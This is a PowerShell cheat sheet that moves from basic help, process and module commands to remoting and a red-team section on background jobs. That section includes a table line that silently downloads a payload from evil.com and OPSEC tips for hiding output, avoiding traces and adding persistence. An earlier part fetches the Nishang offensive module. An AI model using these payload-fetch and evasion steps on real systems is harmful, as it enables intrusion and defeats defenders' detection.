# ğŸ§  PowerShell Basics â€“ Help & Discovery

## ğŸ“˜ Get-Help
Displays detailed information about PowerShell cmdlets (commands).

U sage:
```powershell
Get-Help <cmdlet-name>
```

Example:
```powershell
Get-Help Get-Process
```

Online help:
```powershell
Get-Help Get-Process -Online
```

Search help topics by keyword:
```powershell
Get-Help *process*
Get-Help service
```

---

## ğŸ” Get-Alias
Shows the aliases (shortcuts) for PowerShell cmdlets.

Example:
```powershell
Get-Alias
```

Note:
Useful to understand shortcuts like:
- `ls` is alias for `Get-ChildItem`
- `gci` is also alias for `Get-ChildItem`

---

## ğŸ“‚ Get-ChildItem
Lists the contents of a directory (similar to `ls` in Linux or `dir` in CMD).

Example 1 â€“ Filter by name:
```powershell
Get-ChildItem 'C:\Program Files\' -Filter windows*
```

Example 2 â€“ List hidden items:
```powershell
Get-ChildItem -Path C:\ -Attributes h
```

Note:
- `-Recurse` can be used to list all subdirectories.
- Useful for file discovery and enumeration.

---


 # âš™ï¸ PowerShell â€“ Commands, Process Management & File Copy

## ğŸ” Get-Command

### ğŸ” Search for cmdlets related to "service"
```powershell
Get-Command -Type Cmdlet -Name *service*
```

### ğŸ“Š Count all available cmdlets
```powershell
Get-Command -Type Cmdlet | Measure-Object
```

### ğŸ” List all cmdlets with verb "Start"
```powershell
Get-Command -Verb start
```

Useful for discovering automation commands like `Start-Service`, `Start-Process`, etc.

---

## ğŸ§  Process Management

### ğŸ” Search for processes with a name containing "exp"
```powershell
Get-Process -Name *exp*
```

Example Output:
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
   2763     120   121196     171608     210.11  17136  17 explorer
    741      34    30956      59948       3.72  15712  17 ShellExperienceHost
    629      32    22944      70608       4.39  16904  17 StartMenuExperienceHost
```

---

### â–¶ï¸ Start a new process (Notepad)
```powershell
Start-Process notepad
```

### ğŸ“‹ Get info about Notepad process
```powershell
Get-Process -Name notepad
```

Example Output:
```
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
-------  ------    -----      -----     ------     --  -- -----------
    243      13     3148      14764       0.09   7176  17 notepad
```

### â›” Stop a running process (by ID)
```powershell
Stop-Process -Id 7176
```

---

## ğŸ“ File Operations â€“ Copy File

### ğŸ“‚ Copy a file to another location
```powershell
Copy-Item test.txt C:\Users\APT_1337\Downloads\
```



## ğŸ“ File & Directory Enumeration

### ğŸ“‚ List all items in the current directory (names only)
```powershell
Get-ChildItem | Format-Table -Property Name
```

---

### ğŸ“‚ Detailed list of all items (List format)
```powershell
Get-ChildItem | Format-List
```

---

### ğŸ“‚ Export item names to a text file
```powershell
Get-ChildItem | Format-Table -Property Name | Out-File ./Items.txt
```

---

### ğŸ™ˆ List hidden files and export their names
```powershell
Get-ChildItem -Attributes h | Format-Table -Property Name | Out-File ./HiddenItems.txt
```
> ğŸ’¡ Useful in Red Team operations to find hidden artifacts or tools left by attackers or admins.

---

### ğŸ” List files with their Mode (e.g., hidden, read-only)
```powershell
Get-ChildItem | Format-Table -Property Name, Mode
```
> ğŸ’¡ Helps identify restricted or protected files (e.g., `r--h--`).

---

### ğŸ§© List only file extensions in the directory
```powershell
Get-ChildItem | Format-Table -Property Extension
```
> ğŸ’¡ Can be filtered to find scripts or executables: `.ps1`, `.bat`, `.exe`.

---

## ğŸ§  Process Enumeration

### âš™ï¸ List all running processes (Name + PID)
```powershell
Get-Process | Format-Table -Property Name, Id
```

---

### âš™ï¸ Export process names and IDs to a file
```powershell
Get-Process | Format-Table -Property Name, Id | Out-File ./ProcessNID.txt
```
> ğŸ’¡ Helpful for identifying AV/EDR processes like `MsMpEng`, `csrss`, or suspicious binaries.

---

### ğŸ” Show process info in detailed list format
```powershell
Get-Process | Format-List -Property Name, Id
```

# ğŸ§° PowerShell Module & Execution Policy Management

---

## ğŸ” Execution Policy

### â–¶ï¸ View the current execution policy
```powershell
Get-ExecutionPolicy
```
- Displays the current policy (e.g., `Restricted`, `RemoteSigned`, `Unrestricted`).

---

### ğŸ› ï¸ Change execution policy for the current user
```powershell
Set-ExecutionPolicy -Scope CurrentUser Unrestricted
```
- Allows unrestricted script execution for the current user only.
- âš ï¸ Use with caution in secure environments.

---

## ğŸ“¦ Modules â€“ Managing PowerShell Modules

### ğŸ“‚ List all modules loaded in the current session
```powershell
Get-Module -All
```
- Shows all modules loaded (whether actively imported or not).

---

### ğŸ” List all available modules on the system (not necessarily imported)
```powershell
Get-Module -ListAvailable -All
```
- Lists all modules found in directories from `$env:PSModulePath`.

---

### ğŸŒ Download a module script from the internet
```powershell
Invoke-WebRequest -Uri https://raw.githubusercontent.com/samratashok/nishang/refs/heads/master/powerpreter/Powerpreter.psm1 -OutFile Powerpreter.psm1
```
- Downloads the Powerpreter module from GitHub and saves it locally.

---

### ğŸ“¥ Import a PowerShell module into the current session
```powershell
Import-Module .\Powerpreter.psm1
```
- Loads the module into the session so you can use its functions and commands.

---

### ğŸ§¹ Remove a module from the current session
```powershell
Remove-Module Powerpreter
```
- Unloads the module from memory (does not delete the file from disk).

---

## ğŸ“š Additional Useful Commands

### ğŸ§± Create a custom module directory
```powershell
New-Item -Path "$HOME\Documents\PowerShell\Modules\MyModule" -ItemType Directory
```

---

### ğŸ“ Create a module manifest (.psd1 file)
```powershell
New-ModuleManifest -Path "$HOME\Documents\PowerShell\Modules\MyModule\MyModule.psd1" -RootModule "MyModule.psm1"
```

---

### ğŸ“„ View details about a loaded module
```powershell
Get-Module Powerpreter | Format-List *
```

---

## ğŸ§  Notes

- It's best practice to create a folder named after your module and store `.psm1` and `.psd1` files inside it.
- Make sure your module folder is located within one of the paths in `$env:PSModulePath`.
- To update a module, delete the old file from disk and re-import the new one using `Import-Module`.
- 

# ğŸ’» PowerShell Remoting 
---

## ğŸ”§ 1. Enabling PowerShell Remoting on the Target Machine

Run this on the **target Windows machine** (as Administrator):

Enable-PSRemoting -Force

ğŸ“˜ This enables WinRM, configures the firewall, and sets up the listener to accept remote PowerShell sessions.

---

## ğŸ›  2. Allowing Connections by IP (Optional for Lab Setup)

If you're connecting using an IP address instead of hostname (common in labs):

Set-Item WSMan:\localhost\Client\TrustedHosts -Value "*" -Force

ğŸ“˜ Allows connecting to any IP address. You can also specify an IP instead of *.

---

## ğŸ” 3. Setting the WinRM Service to Auto Start

Set-Service -Name WinRM -StartupType Automatic
Start-Service WinRM

ğŸ“˜ Ensures that the WinRM service starts automatically after reboot.

---

## ğŸ¤ 4. Connecting to a Remote System

### Using Enter-PSSession for Interactive Shell:

Enter-PSSession -ComputerName 192.168.1.10 -Credential (Get-Credential)

ğŸ“˜ Starts an interactive remote session. You'll be prompted for credentials.

---

### Using Invoke-Command for One-Liners:

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { Get-Process }

ğŸ“˜ Executes a one-time command on the remote system and returns the result.

---

## ğŸ§ª 5. Useful Invoke-Command Examples

### Get System Info from Remote Machine

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { systeminfo }

### Get List of Services

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { Get-Service }

### Get Logged In User

Invoke-Command -ComputerName 192.168.1.10 -Credential (Get-Credential) -ScriptBlock { whoami }




# ğŸ§  PowerShell 


---

## âš™ï¸ What Are PowerShell Jobs?

PowerShell **Jobs** are background processes that allow you to execute commands **asynchronously**, meaning they wonâ€™t block the main PowerShell session. Theyâ€™re particularly useful when:
- Executing long-running commands
- Hiding enumeration or payloads from the userâ€™s console
- Reducing operational footprint (OPSEC)

---

## ğŸ› ï¸ Essential PowerShell Job Commands

### â–¶ï¸ Start a job in the background

Start-Job -ScriptBlock { COMMAND }

### ğŸ“„ View all running or completed jobs

Get-Job

### ğŸ“¥ Receive the output of a job

Receive-Job -Id  id;

### ğŸ§¼ Remove a specific job

Remove-Job -Id  id ;

### âŒ Remove all jobs

Get-Job | Remove-Job

### ğŸ” Find cmdlets that support `-AsJob`

Get-Command -ParameterName AsJob

### â–¶ï¸ Example: Run a supported command as a job

Get-Process -Name explorer -AsJob

---

## ğŸ§ª Red Team Examples Using PowerShell Jobs

| ğŸ¯ Objective | ğŸ’» Job Example |
|-------------|----------------|
| **Silent Enumeration** | Start-Job { Get-ADUser -Filter * } |
| **Download Payload Silently** | Start-Job { Invoke-WebRequest -Uri "http://evil.com/payload.exe" -OutFile "$env:TEMP\payload.exe" } |
| **Run Recon Tool in Background** | Start-Job { nmap -sS 10.0.0.0/24 -oN C:\Users\Public\scan.txt } |
| **Dump Local Admins** | Start-Job { Get-NetLocalGroupMember -GroupName "Administrators" | Out-File C:\Users\Public\admins.txt } |

---

## ğŸ” OPSEC Considerations

- âœ… Always **clean up jobs** after completion:

  Get-Job | Remove-Job

- âœ… Save output to **non-suspicious locations**:
  - %TEMP%
  - %APPDATA%
  - C:\ProgramData
  - C:\Users\Public

- âœ… Avoid leaving traces:
  - Redirect output to memory or remote listener if possible
  - Remove temporary files after use

---

## ğŸ§© Pro Tips

- Combine with Scheduled Tasks, .NET, or WMI for advanced persistence.
- Chain jobs to run multiple stages of an attack asynchronously.
- Use `-AsJob` when supported for native job handling.




 
